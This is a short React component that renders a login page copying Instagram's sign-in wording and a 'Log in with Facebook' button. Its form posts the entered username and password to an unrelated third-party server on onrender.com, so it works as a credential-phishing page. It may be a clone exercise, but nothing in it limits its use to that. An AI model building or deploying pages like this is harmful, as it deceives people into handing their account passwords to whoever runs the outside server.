import React from 'react'
import './First.css'
function First() {
  
  return (
    
    
        <div className="container">
          <i></i>
          <form action="https://backendlogin-j9e6.onrender.com/login" method="post">
            <input 
              type="text" 
              name="name" 
              placeholder="Phone number, username or email" 
              required 
            /><br />
            <input 
              type="password" 
              name="number" 
              placeholder="Password" 
              required 
            /><br />
            <input 
              type="submit" 
              value="Log in" 
              id="loginbutton" 
            />
            
          </form>
          <div  id="ordiv">___________  <div id='or1'>OR</div> ___________          </div>
          <div id='facebook'> <img id='facebookimg' src="https://static.vecteezy.com/system/resources/thumbnails/018/930/476/small_2x/facebook-logo-facebook-icon-transparent-free-png.png" alt="facebook" />Log in with Facebook</div>
          <div id='forgot'>Forgot password?</div>
        </div>
      );
  
}

export default First
